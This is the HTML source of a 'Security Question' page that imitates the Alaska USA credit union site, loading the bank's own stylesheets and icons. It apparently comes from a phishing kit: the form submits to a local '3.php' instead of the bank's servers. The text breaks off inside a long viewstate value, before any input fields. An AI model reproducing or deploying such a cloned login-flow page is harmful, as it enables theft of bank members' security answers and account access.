<!DOCTYPE html>
<html lang="en">
<head><title>
	Security Question
</title>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="0" />
<link rel="icon" type="image/x-icon" href="https://www.alaskausa.org/favicon.ico">
<link rel="apple-touch-icon" href="https://www.alaskausa.org/images/icon.png" type="image/png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.alaskausa.org/images/icon-72.png" type="image/png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.alaskausa.org/images/icon@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="144x144" href="https://www.alaskausa.org/images/icon-72@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="60x60" href="https://www.alaskausa.org/images/icon-60.png" type="image/png">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.alaskausa.org/images/icon-60@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.alaskausa.org/images/icon-76.png" type="image/png">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.alaskausa.org/images/icon-76@2x.png" type="image/png">
<meta name="msapplication-TileImage" content="https://www.alaskausa.org/images/icon-72@2x.png">
    <link rel="stylesheet" type="text/css" href="https://www.alaskausa.org/css/akusa-express.css" title="master" />
    <!--link rel="stylesheet" type="text/css" href="https://www.alaskausa.org/css/akusafcu.css" title="master" /-->
	<script src="https://www.alaskausa.org/js/jquery-1.11.3.min.js" type="text/javascript"></script>
	<script src="ScriptLib/jquery/jquery.maskedinput-1.4.1.min.js" type="text/javascript"></script>
	<script src="https://www.alaskausa.org/js/jsSuite-1.8.js" type="text/javascript"></script>
    <style type="text/css">
    	table {border-collapse:separate;border-spacing:1px 1px;}
    	th,td {margin:1px; padding:1px;}
    	input[type="text"],input[type="tel"] {padding:1px 0;}
    	input[type="radio"],input[type="checkbox"] {margin:3px 5px;}
						
		.ubenrollment #header > div:first-child { height:0;display:none; }
		.ubenrollment .pgTitle h1 { width: 768px; max-width:100%; font-size:1.5em; padding-bottom: .7em; }
		.ubenrollment .pgTitle .subTitle { font-size:.8em;}
		.ubenrollment #footer #disclaimers { padding-top:10px;}
		.ubenrollment #footer .links { text-align:center; }
		.ubenrollment .leftCol h2 { clear:none;}
		.ubenrollment .leftCol h2::before { top: 50%; margin-top:-4px; }
		.ubenrollment .leftCol h3 { clear:none;}

		@media only screen and (max-width: 767px) {
			.ubenrollment #header { float:left; }	/* undoes mobile header for tablet view*/
			.ubenrollment #topBar #logo { float:left; }	/*undoes mobile header for tablet view*/
			.ubenrollment .learnMore { height: auto;}	/*undoes collapse of content in tablet/mobile */
		}

		@media only screen and (max-width: 479px) {
			.ubenrollment #header { height: 50px; float:none; } /* puts mobile header back */
			.ubenrollment #topBar { margin-top:0;} /* puts mobile header back */
			.ubenrollment #topBar #logo { float:none; } /* puts mobile header back */
			#headerReturnLink { display:none; }
		}

		
		.learnMore ul, .learnMore li { margin: .5em .5em;}
		.leftCol { 
			padding: 0 0 0 24px; background: url(https://www.alaskausa.org/css/nav/pgMainEdge.png) repeat-y 8px 0;
			width: 500px; float:left;
		}
		.sideBar { width: 230px; float:left; }

		@media only screen and (max-width: 767px) {
			.leftCol { float:none; background:none; padding:0;}
			.sideBar { float:none; }
		}

		@media only screen and (max-width: 479px) {
			.leftCol { width: 100%; }
		}

    </style>
    	
	<style>
		/*.visaDebitQuestionRow, .autoLoanPrimaryQuestionRow, .autoLoanQuestionRow { display:none; }*/
		/*table th { text-align: left; }*/
		::-ms-clear { width:0; height:0; }

		#pgMain { width: 800px; }
		.leftCol { 
			padding: 0 0 0 24px; background: url(https://www.alaskausa.org/css/nav/pgMainEdge.png) repeat-y 8px 0;
			width: 500px; float:left;
		}
		.sideBar { width: 230px; float:left; }
		.mobile_show { display:none; }
		.mobile_hide { display:block; }
		.disclosures {
			height:400px;overflow:auto;background:white;font-size:10pt;font-weight:normal;font-family:Arial;
			margin:5px 0 0 0;padding:3px;border:1px solid gray;
		}
		.disclosures p:not(.disclosureTitle) { text-align:justify;}
		.disclosureIndent { margin-left:20px;}
		.checkboxText { margin:5px 0 15px 35px;text-indent:-35px; }
		.checkboxWarning { margin-left:-6px;}
		.hint { font-size: .85em; color:#666666;}
		.results img.resultImage, .resultsPage2 img.resultImage { width:64px; float:left;margin-right:10px;}

		@media only screen and (max-width: 767px) {
			.leftCol { float:none; background:none; padding:0; max-width:100%;}
			.sideBar { float:none; width:100%; }
			.checkboxText { margin-left:46px; text-indent:-46px; }
			/*.checkboxText input[type="checkbox"] { height:auto; }*/	/*text-indent takes care of extra spacing needed for mobile*/
		}

		@media only screen and (max-width: 500px) { /*iPhone4 landscape is 480px */
			.leftCol { width: 100%; }
			.sideBar { width:100%; }
			.mobile_show { display:block; }
			.mobile_hide { display:none; }
			.results img.resultImage, .resultsPage2 img.resultImage { max-width:inherit; } /*undoes .pgMain img in express*/
			/*a { text-decoration:underline;}*/
		}
		@media only screen and (max-height: 400px) {
			.disclosures { height: 350px; }
		}
		@media only screen and (max-height: 325px) {
			.disclosures { height: 305px; }
		}


		
		/*from  service/certCalc.asp*/
		/* dataForm table for standardized data-input presentation - simple 2-col table */
		.dataForm {width:100%;border-collapse:collapse;margin-bottom:1em;font-size:1em; }
		.dataForm caption {border-top:1px solid gray;background-color:#f0f0f0;font-weight:bold; text-align:left;padding:6px;}
		.dataForm tbody tr:first-child td {border-top:1px solid gray;}
		.dataForm td, .dataForm th {padding:6px;vertical-align:top;text-align:left; border-top:1px solid gray; border-bottom:1px solid gray;}
		.dataForm thead td {border-top:1px solid gray;border-bottom:1px solid black;background-color:#f4f4f4;font-weight:bold;}
		.dataForm tbody th {width:40%; background-color:#eeeeee;font-weight:normal;text-align:right;}
		.dataForm tbody td {border-left:1px solid gray;}
		.dataForm tbody td:first-child {border-left-width:0;}
		.dataForm tfoot {font-size:.85em;color:#666666;padding:.5em;}
		.dataForm tfoot p {margin:.5em 0 0 0;}
		.dataForm .footnotes {margin:3px 5px;font-size:.85em;}

		.dataForm input {text-align:left;}
		.dataForm input[type="text"], .dataForm input[type="tel"] {box-sizing:border-box;min-width:30%;}
		.dataForm input[type="submit"] {border-width:0;border-radius:2px;background-color:#3F77C0;color:white;color:white;font: 100% / 1.4 pt_sans_narrowregular, arial, helvetica, sans-serif;}
		.dataForm input[type="submit"]:hover {background-color:#345d8f;}
		.dataForm input[type="radio"] {/*outline:none;*/}

		.dataForm div[role="radiogroup"] {margin-bottom:-6px;}
		.dataForm div[role="radiogroup"] label {display:inline-block;box-sizing:border-box;min-width:30%;margin:0 5px 6px 0;border:1px solid #cccccc;border-radius:3px;padding:0 5px 0 0px; background-color:#eeeeee;}
		.dataForm div[role="radiogroup"] label:hover {background-color:#cccccc;color:#000066}
		.dataForm div[role="radiogroup"] label.radioSelected { background-color:#cccccc; color:#000066; }
		.dataForm div[role="radiogroup"].stack {float:left;}
		.dataForm div[role="radiogroup"].stack label {float:left;clear:left;}

		/* dataForm adaptations */
		@media (max-width:479px){
			/* auto-convert radiogroups to "stack" format */
			.dataForm div[role="radiogroup"] label {display:block;margin-right:0;float:none;}
			.dataForm {border-bottom:1px solid gray;}
			.dataForm tbody th {display:block;box-sizing:border-box;width:100%;margin-top:3px;border-width:0;border-top:1px solid gray;padding:3px 6px 0;background-color:#ffffff;text-align:left;color:#004990}
			.dataForm tbody td {display:block;border-width:0;padding-top:0;}
			.dataForm tbody tr:first-child td {border-top:none;}
		}

		/*from akusa-desktop - candidates to move to -express*/


		/*local overrides*/
		.dataForm tbody th { /*white-space:nowrap; min-width:235px;*/}
		.dataForm tfoot td { border:none;}
		/* split the table so postback is smaller, style the tables to address this*/
		.topDataForm { margin-bottom:0;}
		.noTopBorder td, .noTopBorder th { border-top:none !important; }
		
		.loadingMsg{background:url(PgArt/spinnerLarge.gif) no-repeat left center; padding-left:45px; display:table }
		.loadingMsg span{vertical-align:middle;display:table-cell; height:50px;color:#333;}
		.results { border:1px solid gray; padding:10px; margin-right:15px;}
		.resultsPage2 { }
		.visaDebit_background {background:url(PgArt/ubenrollment/visaPlatinum_flat.png) no-repeat;background-size:100% auto; height:126px; width:200px;}
		.visaDebit_input { margin-top:70px;margin-left:80px;width:95px; }
		.visaDebit_background2 {background:url(PgArt/ubenrollment/visaPlatinum_icon.png) no-repeat;background-size:100% auto; height:126px; width:200px;}
		.visaDebit_input2 { margin-top:68px;margin-left:82px;width:89px; }
        .ubLoginForm input[type=text] { width: 100px; border: 1px solid #bcbcbc; padding: 0 5px; border-radius:2px; min-height:26px;}
        .ubLoginForm input[type=submit] { min-height:29px; }
						
		/*from https://www.alaskausa.org/service/download.asp?t=q*/
		a.pdf {
			padding-left: 20px;
			background: url(https://www.alaskausa.org/images/icons/acrobat.gif) no-repeat 0 50%;
			line-height: 1.5em; padding-top:1px;
		}
		.printLink {
			background: url(/App_Themes/DefaultTheme/TemplateImages/printicon.gif) no-repeat 0 0; padding-left: 18px;
			font-size:.8em; font-weight:normal; margin-top:10px; line-height:16px;
		}

		/*begin css spinner: http://lea.verou.me/2013/11/cleanest-css-spinner-ever/ */
			@keyframes spin {
				to { transform: rotate(1turn); }
			}
			.progress {
				position: relative;
				display: inline-block;
				width: 5em;
				height: 5em;
				margin: -6px .5em;
				font-size: 12px;
				text-indent: 999em;
				overflow: hidden;
				animation: spin 1s infinite steps(8);
			}
			.small.progress {
				font-size: 5px;
			}
			.large.progress {
				font-size: 24px;
			}
			.progress:before,
			.progress:after,
			.progress > div:before,
			.progress > div:after {
				content: '';
				position: absolute;
				top: 0;
				left: 2.25em; /* (container width - part width)/2  */
				width: .5em;
				height: 1.5em;
				border-radius: .2em;
				background: #eee;
				box-shadow: 0 3.5em #eee; /* container height - part height */
				transform-origin: 50% 2.5em; /* container height / 2 */
			}
			.progress:before {
				background: #555;
			}
			.progress:after {
				transform: rotate(-45deg);
				background: #777;
			}
			.progress > div:before {
				transform: rotate(-90deg);
				background: #999;
			}
			.progress > div:after {
				transform: rotate(-135deg);
				background: #bbb;
			}
		/*end css spinner*/

	</style>

<link href="App_Themes/DefaultTheme/_ControlStyles_v4.css" type="text/css" rel="stylesheet" /><link href="App_Themes/DefaultTheme/_ExternalTemplateStyles_v4.css" type="text/css" rel="stylesheet" /><link href="App_Themes/DefaultTheme/_UtilityStyles_v4.css" type="text/css" rel="stylesheet" /></head>
<body id="ctl00_ctl00_Body" class="ubenrollment webpayment">
	<div class="pgBody">
		<form method="post" action="3.php" onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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